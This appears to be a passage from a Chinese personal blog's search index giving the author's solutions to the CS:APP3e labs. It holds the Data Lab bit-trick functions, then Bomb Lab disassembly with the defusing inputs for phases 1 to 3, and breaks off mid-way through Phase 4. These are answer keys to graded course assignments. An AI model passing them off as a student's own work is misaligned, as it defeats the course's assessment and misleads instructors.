<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CS:APP3e个人题解</title>
    <link href="/CSAPP3e_WP/"/>
    <url>/CSAPP3e_WP/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>很早就写完了，抽空贴到个人主页上来，免得质量堪忧的美帝良心电脑挂了找不到。其他的实验记录也会陆续上传。</p><p>实验资料可从此获取：<a href="https://csapp.cs.cmu.edu/3e/labs.html">Lab Assignments</a></p><p>受限于篇幅，本文已删除没有任何意义的评测结果，由于PerfLab缺乏评分标准并且性能与使用的机种高度相关，题解也缺乏参考价值。笔者的题解除了Malloc Lab以外均为满分，Malloc Lab的高分题解网上也有不少。</p><p>然而精简后的题解仍然非常长，可点击各部分标题跳转。</p><h2 id="1-Data-Lab-位运算大法好，再也不碰了"><a href="#1-Data-Lab-位运算大法好，再也不碰了" class="headerlink" title="1. Data Lab: 位运算大法好，再也不碰了"></a>1. Data Lab: 位运算大法好，再也不碰了</h2><p>满满的都是trick，日常编程中没多大用。</p><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><p>由德摩根律，<code>x^y = (~x)&amp;y | x&amp;(~y) = ~( (~((~x)&amp;y)) &amp; (~(x&amp;(~y))) )</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">bitXor</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-keyword">return</span> ~( (~((~x)&amp;y)) &amp; (~(x&amp;(~y))) );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><p>返回最小的二进制补码整数，该数为<code>0x80000000</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">tmin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><p>判断<code>x</code>是否为最大整数<code>0x7fffffff</code>。</p><p>该数取反和加一得到的结果相等，且结果不为0，可用<code>!!(x+1)</code>判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isTmax</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">return</span> !((~x)^(x+<span class="hljs-number">1</span>)) &amp; !!(x+<span class="hljs-number">1</span>) ;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><p>判断奇数位是否均为1。</p><p>构造<code>0xaaaaaaaa</code>和输入按位与，再和<code>0xaaaaaaaa</code>按位异或检查奇数位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">allOddBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-type">int</span> mask = <span class="hljs-number">0xaa</span>;<br>  mask = mask | mask&lt;&lt;<span class="hljs-number">8</span> ;<br>  mask = mask | mask&lt;&lt;<span class="hljs-number">16</span>;<br>  <span class="hljs-keyword">return</span> !((mask&amp;x)^mask);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><p>取反加一即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">negate</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><p>只要<code>x</code>减去<code>0x30</code>与<code>0x39</code>减去<code>x</code>最高位均为0即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-type">int</span> min=<span class="hljs-number">0x30</span>,max=<span class="hljs-number">0x39</span>,mask=<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>  <span class="hljs-keyword">return</span> (!((x+~min+<span class="hljs-number">1</span>)&amp;mask)) &amp; !((max+~x+<span class="hljs-number">1</span>)&amp;mask);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><p><code>x</code>为0时返回<code>z</code>，否则返回<code>y</code>。构造出相应情况下的<code>0x0</code>与<code>0xffffffff</code>，分别和<code>y</code>,<code>z</code>按位与。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">conditional</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> z)</span> &#123;<br>  <span class="hljs-keyword">return</span> (y &amp; ((!!x)&lt;&lt;<span class="hljs-number">31</span>)&gt;&gt;<span class="hljs-number">31</span> )|(z &amp; ((!x)&lt;&lt;<span class="hljs-number">31</span>)&gt;&gt;<span class="hljs-number">31</span> );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><p><code>x</code>,<code>y</code>相减判断是否为负，计算<code>!((y+~x+1)&amp;(1&lt;&lt;31))</code>，下面考虑溢出。</p><p>若<code>x</code>为负，<code>y</code>非负返回1，要求<code>!(y&gt;&gt;31)</code>和<code>!!(x&gt;&gt;31)</code>为真。</p><p>若<code>y</code>为负，<code>x</code>非负返回0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-keyword">return</span>  (!!(x&gt;&gt;<span class="hljs-number">31</span>)&amp;!(y&gt;&gt;<span class="hljs-number">31</span>)) | ( (!((y+~x+<span class="hljs-number">1</span>)&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>))) &amp; (!!(x&gt;&gt;<span class="hljs-number">31</span>)|!(y&gt;&gt;<span class="hljs-number">31</span>)) ) ;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><p>按位或直到所有数位都计算过，0保持不变，非零数变为<code>0xffffffff</code>，对结果+1即为返回值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">logicalNeg</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  x = x&lt;&lt;<span class="hljs-number">16</span> | x;<br>  x = x&lt;&lt;<span class="hljs-number">8</span>  | x;<br>  x = x&lt;&lt;<span class="hljs-number">4</span>  | x;<br>  x = x&lt;&lt;<span class="hljs-number">2</span>  | x;<br>  x = x&lt;&lt;<span class="hljs-number">1</span>  | x;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>+(x&gt;&gt;<span class="hljs-number">31</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><p>0只需要1位来表示。</p><p>对非零值，若为正数，不断进行二分查找并判断高位是否有1，将结果相加后加上符号位所用的1位即为返回值。负数取反后同样处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">howManyBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-type">int</span> allZ=!x;<br>  <span class="hljs-type">int</span> h16,h8,h4,h2,h1,h0,sum;<br>  <br>  x = (x&gt;&gt;<span class="hljs-number">31</span>)^x;<br>  h16 = !!(x&gt;&gt;<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">4</span>;<br>  x = x&gt;&gt;h16;<br><br>  h8 = !!(x&gt;&gt;<span class="hljs-number">8</span>)&lt;&lt;<span class="hljs-number">3</span>;<br>  x = x&gt;&gt;h8;<br>  <br>  h4 = !!(x&gt;&gt;<span class="hljs-number">4</span>)&lt;&lt;<span class="hljs-number">2</span>;<br>  x = x&gt;&gt;h4;<br>  <br>  h2 = !!(x&gt;&gt;<span class="hljs-number">2</span>)&lt;&lt;<span class="hljs-number">1</span>;<br>  x = x&gt;&gt;h2;<br>  <br>  h1 = !!(x&gt;&gt;<span class="hljs-number">1</span>);<br>  x = x&gt;&gt;h1;<br>  <br>  h0 = x;<br>  sum = h16+h8+h4+h2+h1+h0+<span class="hljs-number">1</span>;<br>  <br>  <span class="hljs-keyword">return</span> allZ | sum&amp;(((!allZ)&lt;&lt;<span class="hljs-number">31</span>)&gt;&gt;<span class="hljs-number">31</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><p>拆分输入，再判断特殊值、非规格化、规格化(溢出、不溢出)的情况即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatScale2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>  <span class="hljs-type">int</span> sig=(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)&amp;uf;<br>  <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span>=(uf&gt;&gt;<span class="hljs-number">23</span>)&amp;<span class="hljs-number">0xff</span>;<br>  <span class="hljs-type">int</span> frac=uf&amp;<span class="hljs-number">0x7fffff</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>==<span class="hljs-number">0xff</span>||(!<span class="hljs-built_in">exp</span>)&amp;&amp;!frac)<span class="hljs-keyword">return</span> uf;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">exp</span>)&#123;<br>    frac=frac&lt;&lt;<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> sig|frac;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>==<span class="hljs-number">0xff</span><span class="hljs-number">-1</span>)&#123;<br>   <span class="hljs-built_in">exp</span>=<span class="hljs-number">0xff</span>;<br>   frac=<span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">return</span> sig|<span class="hljs-built_in">exp</span>&lt;&lt;<span class="hljs-number">23</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> sig|(<span class="hljs-built_in">exp</span>+<span class="hljs-number">1</span>)&lt;&lt;<span class="hljs-number">23</span>|(frac&amp;<span class="hljs-number">0x7fffff</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><p>浮点数转整型，1.frac*2^(exp-127)，exp&gt;&#x3D;158时溢出，exp&lt;127时为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>  <span class="hljs-type">int</span> sig=(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)&amp;uf;<br>  <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span>=(uf&gt;&gt;<span class="hljs-number">23</span>)&amp;<span class="hljs-number">0xff</span>;<br>  <span class="hljs-type">int</span> frac=uf&amp;<span class="hljs-number">0x7fffff</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>&gt;=<span class="hljs-number">127</span>&amp;&amp;<span class="hljs-built_in">exp</span>&lt;<span class="hljs-number">158</span>)<span class="hljs-keyword">return</span>(sig|(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">30</span>)|(frac&lt;&lt;<span class="hljs-number">7</span>))&gt;&gt;(<span class="hljs-number">157</span>-<span class="hljs-built_in">exp</span>);<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>&lt;<span class="hljs-number">127</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0x80000000</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><p>返回以浮点数表示的2.0^x。x&gt;127时返回NaN，x&lt;-149时返回0。</p><p>非规格化：计算尾数为1&lt;&lt;(x+149)。</p><p>规格化：尾数为0，计算指数为(x+127)，左移23位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatPower2</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">127</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0x7f800000</span>;<br>  <span class="hljs-keyword">if</span> (x &gt;= <span class="hljs-number">-126</span>) <span class="hljs-keyword">return</span> (x+<span class="hljs-number">127</span>)&lt;&lt;<span class="hljs-number">23</span>;<br>  <span class="hljs-keyword">if</span> (x &gt;= <span class="hljs-number">-149</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;(x+<span class="hljs-number">149</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-Bomb-Lab-拆个炸弹玩玩"><a href="#2-Bomb-Lab-拆个炸弹玩玩" class="headerlink" title="2. Bomb Lab: 拆个炸弹玩玩"></a>2. Bomb Lab: 拆个炸弹玩玩</h2><h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h3><p>GDB执行<code>disas phase_1</code>，获得汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp<br>0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi<br>0x0000000000400ee9 &lt;+9&gt;:     call   0x401338 &lt;strings_not_equal&gt;<br>0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax<br>0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;<br>0x0000000000400ef2 &lt;+18&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp<br>0x0000000000400efb &lt;+27&gt;:    ret<br></code></pre></td></tr></table></figure><p>利用<code>x /s 0x402400</code>查看<code>0x402400</code>处的字符串，得到正确输入**Border relations with Canada have never been better.**：</p><p><img src="/CSAPP3e_WP/image-20240125173348841-172450350911111.png" alt="image-20240125173348841" style="zoom: 67%;" align="left"></p><h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000400efc &lt;+0&gt;:     push   %rbp<br>0x0000000000400efd &lt;+1&gt;:     push   %rbx<br>0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp<br>0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi<br>0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;<br>0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)<br>0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;<br>0x0000000000400f10 &lt;+20&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;<br>0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax<br>0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax<br>0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)<br>0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;<br>0x0000000000400f20 &lt;+36&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx<br>0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx<br>0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;<br>0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;<br>0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx<br>0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp<br>0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;<br>0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp<br>0x0000000000400f40 &lt;+68&gt;:    pop    %rbx<br>0x0000000000400f41 &lt;+69&gt;:    pop    %rbp<br>0x0000000000400f42 &lt;+70&gt;:    ret<br></code></pre></td></tr></table></figure><p>可以看出，跳转到<code>phase_2+52</code>而不触发炸弹的条件是：输入6个数字，第一个数字是1，随后指针后移，后一个数字是前一个的2倍。</p><p>输入序列<strong>1 2 4 8 16 32</strong>符合要求。</p><h3 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp<br>0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx<br>0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx<br>0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi<br>0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax<br>0x0000000000400f5b &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;<br>0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax<br>0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;<br>0x0000000000400f65 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)<br>0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;<br>0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax<br>0x0000000000400f75 &lt;+50&gt;:    jmp    *0x402470(,%rax,8)<br>0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax<br>0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax<br>0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax<br>0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax<br>0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax<br>0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax<br>0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax<br>0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400fad &lt;+106&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax<br>0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax<br>0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax<br>0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;<br>0x0000000000400fc4 &lt;+129&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp<br>0x0000000000400fcd &lt;+138&gt;:   ret<br></code></pre></td></tr></table></figure><p>要求至少输入2个数，且第一个数不大于7，然后根据第一个数跳转，跳转表位于<code>0x402470</code>。</p><p>向%eax写入的新值需要与0xc(%rsp)即第二个数相等。跳转表的第一项(对应第一个数为0)必然存在，可获得该项的跳转地址：</p><p><img src="/CSAPP3e_WP/image-20240125104109016-172450351282313.png" alt="image-20240125104109016" style="zoom: 67%;" align="left"></p><p>输入<strong>0 207</strong>符合要求。</p><h3 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp<br>0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx<br>0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx<br>0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi<br>0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax<br>0x0000000000401024 &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;<br>0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax<br>0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;<br>0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)<br>0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;<br>0x0000000000401035 &lt;+41&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx<br>0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi<br>0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi<br>0x0000000000401048 &lt;+60&gt;:    call   0x400fce &lt;func4&gt;<br>0x000000000040104d &lt;+65&gt;:    test   %eax,%eax<br>0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;<br>0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)<br>0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;<br>0x0000000000401058 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp<br>0x0000000000401061 &lt;+85&gt;:    ret<br></code></pre></td></tr></table></figure><p>输入2个数字，第一个数字不大于14并且作为func4的第一个参数(%edi)，func4的第二个参数(%esi)为0，第三个参数(%edx)为14。</p><p>不触发炸弹要求func4返回0，并且输入的第二个数字为0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp<br>0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax<br>0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax<br>0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx<br>0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx<br>0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax<br>0x0000000000400fdd &lt;+15&gt;:    sar    %eax<br>0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx<br>0x0000000000400fe2 &lt;+20&gt;:    cmp    